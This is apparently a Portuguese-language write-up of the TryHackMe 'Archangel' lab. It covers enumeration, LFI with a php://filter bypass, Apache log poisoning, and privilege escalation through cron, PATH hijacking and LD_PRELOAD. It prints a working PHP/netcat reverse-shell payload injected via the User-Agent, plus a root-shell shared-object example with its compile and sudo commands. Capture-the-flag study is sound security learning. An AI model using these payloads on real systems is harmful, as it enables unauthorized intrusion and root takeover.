# Tópico
Archangel
# Tags

#tryhackme 

# Resumo
## Enumeração
### Nmap
Rodei o nmap -sS para não completar o aperto de 3 vias no ip alvo e achei que o alvo está com as portas 22 e 80 abertas (ssh e http), com isso vou para a etapa seguinte que é utilizar o gobuster dir para enumerar os diretórios.
### Gobuster
Com gobuster dir rodando em cima do ip http coloquei para mostrar arquivos de extensões php , txt, html , css , js e md. De primeira apareceram esses resultados 
images              (Status: 301) [Size: 315] [--> http://10.64.135.231/images/]
pages                (Status: 301) [Size: 314] [--> http://10.64.135.231/pages/]
flags                (Status: 301) [Size: 314] [--> http://10.64.135.231/flags/]
layout               (Status: 301) [Size: 315] [--> http://10.64.135.231/layout/]
licence.txt          (Status: 200) [Size: 5014]  -> aparecem informações de licença da plataforma
#### images
index.html           (Status: 200) [Size: 0]
demo                 (Status: 301) [Size: 320] [--> http://10.64.135.231/images/demo/]
##### demo
index.html           (Status: 200) [Size: 0]
gallery              (Status: 301) [Size: 328] [--> http://10.64.135.231/images/demo/gallery/]
avatar.png           (Status: 200) [Size: 454]
backgrounds          (Status: 301) [Size: 332] [--> http://10.64.135.231/images/demo/backgrounds/]
###### backgrounds
index.html           (Status: 200) [Size: 0]
01.png               (Status: 200) [Size: 20855]

###### gallery
index.html           (Status: 200) [Size: 0]
01.png               (Status: 200) [Size: 2500]

#### pages
index.html           (Status: 200) [Size: 0]
gallery.html         (Status: 200) [Size: 13209]

#### mafialive.thm
No ip normal não achei mais coisa , então fui para o mafialive.thm e associei ele ao ip pelo /etc/hosts, assim eu usei o gobuster e mostrou 3 arquivos , um deles sendo o index.html , outro o robots.txt e o outro é o test.php, nisso arquivos colocados no view do path de url são executados pelo comando cat , nisso quero utilizar para ver o codigo do test.php.Esse test.php tem vulnerabilidade de LFI então colocando ./.././../ consegui acessar o etc/passwd , mas nisso pesquisei e tem uma vulnerabilidade de poison log que utilizei no apache que podemos colocar um <?php system($_GET['cmd']) ?> dentro do user agent de uma requisição e passar no parametro de url o caminho do acess log com &cmd=comando em seguida , permitindo que executemos um comando e ele irá aparecer no log.Além disso utilizei esse comando php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php para enganar o filtro e conseguir converter o test.php em base64 e depois fui no cyberchef e desfiz o base64 e assim consegui ler o arquivo test.php.Mandei no user agent pelo burp suite esse seguinte codigo "<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 1234 >/tmp/f') ?>" e assim quando fui e no view coloquei para ir pro acess.log do apache o servidor executou esse código e eu estava ouvindo , assim recebi a shell reverse.
## Primeira Pergunta
Foi me apresentado a pergunta de achar um hostname diferente , ao abrir a pagina em deparei com um email que tinha mafialive.thm , coloquei isso na resposta e acertei
## Segunda Pergunta
Com o hostname da primeira pergunta eu coloquei http://mafialive.thm e nela havia a flag da pergunta 2 .
## Terceira Pergunta
test.php que foi achado usando o gobuster no mafialive.thm.

## Quarta Pergunta
Foi uma flag encontrada dentro do arquivo test.php quando peguei concha no sistema eu vi.

## Quinta pergunta
Foi uma flag encontrada dentro do arquivo user.txt presente no /home/archangel que era um diretório que eu tinha acesso

## Sexta Pergunta 
Uma flag foi encontrada no pasta secret que era só de acesso do archangel mas ele tinha uma cronjob no crontab que executava de minuto em minuto , eu tinha permissão de alterar o arquivo então coloquei chmod 777 /home/secret e assim consegui acessar.

## Sétima Pergunta
Havia uma arquivo chamado backup que ele executava com ID de usuário e como root e ao tentar executar ele é visto que o comando cp é chamado , com isso alterei o PATH para o $PWD e criei um arquivo chamado cp que continha bash -p e assim executei ./backup que ao ser executado criou um bash como root e assim consegui a ultima flag na paste do root.

## Observações 
Quando houver LFI procurar ver como burlar o filtro se houver e caso consiga burlar procurar pelo apache2/access.log, se o include que executa e mostra esse arquivo conseguir mostrar ele corretamente podemos injetar um log malicioso de shell reverse, e para que o código malicioso funcione podemos utilizar o burp suite no modo proxy para barrar a requisição antes de chegar no servidor e com isso alteramos o User Agent visto que o access.log do apache armazena os User Agents das requisições , e o erro está nisso.Mudando o User Agent para "<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 1234 >/tmp/f') ?>" e mandando a requisição normalmente injetamos um poison log e podemos utilizar o metasploit para criar um handle para esse revershell , e ao acessar o view do apache2/access.log o servidor alvo executa o código malicioso e cria a shell reverse que conseguimos conectar no nosso computador. 
Outra observação é que ao achar arquivos executáveis com SUID devemos ler eles e procurar comandos que esse arquivo acaba executando , nessa sala foi o comando cp de copy que dava para ser visto executando ./backup e mostrava erro no uso do codigo cp , com isso vemos que podemos criar um cp executável e mudar o PATH para colocar o $PWD do cp infectado e assim ao chamar ./backup novamente o cp utilizado será o nosso visto que ao colocar $PWD antes de $PATH estamos dizendo para o sistema buscar o executável cp no $PWD antes dos outros lugares que normalmente est]ao os binários, assim foi possível colocar o comando bash -p que ao executar o arquivo ./backup foi criado um shell com user root , visto ao digitar id, e assim podemos fazer o que quisermos no sistema pois estamos no privilégio maior.
Devemos sempre atentar em tentar olhar o sudo -l , procurar por arquivos de SUID , crontab , ver se podemos mudar o PATH , olhar se há NFS e se ele é vulnerável , olhar o getcap para ver capacidade de executarmos comandos que necessitam de privilégio maior sem ter de ter esse privilégio, além de executáveis como nmap podem criar shells como root as vezes , podemos procurar por alavancagem preload que são arquivos de biblioteca do sistema que o linux carrega ao executar coisas de .so , assim podemos criar um arquivo em c que carrega um código malicioso e colocar ele como LD_PRELOAD.Exemplo:
```C
#include <stdio.h> 
#include <sys/types.h> 
#include <stdlib.h> 
void _init() { 
// Função executada assim que a biblioteca é carregada 
unsetenv("LD_PRELOAD"); 
// Limpa para evitar loops 
setgid(0); 
// Define GID como root 
setuid(0); 
// Define UID como root 
system("/bin/bash"); 
// Executa a shell }
```
Podemos criar um arquivo desse tipo se o LD_PRELOAD estiver ativo no sistema.
o Arquivo inicialmente podemos chamar de shell.c e depois devemos utilizar o gcc para compilar ele como .so:
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
Assim criamos um arquivo shell.so que depois podemos pegar um comando que a gente consegue executar como sudo e faz algo desse tipo aqui :
```bash
sudo LD_PRELOAD=/home/user/shell.so openssl
```
Na qual dizemos que antes de pegar as bibliotecas padrões, queremos que o linux carregue essa nossa biblioteca infectada e executando o openssl com sudo vai acontecer de nosso arquivo ser executado como sudo e um shell irá ser executado como usuário root.
Porém nessa máquina o LD_PRELOAD não estava presente , bem como o sudo -l não era permitido para o nosso usuário.




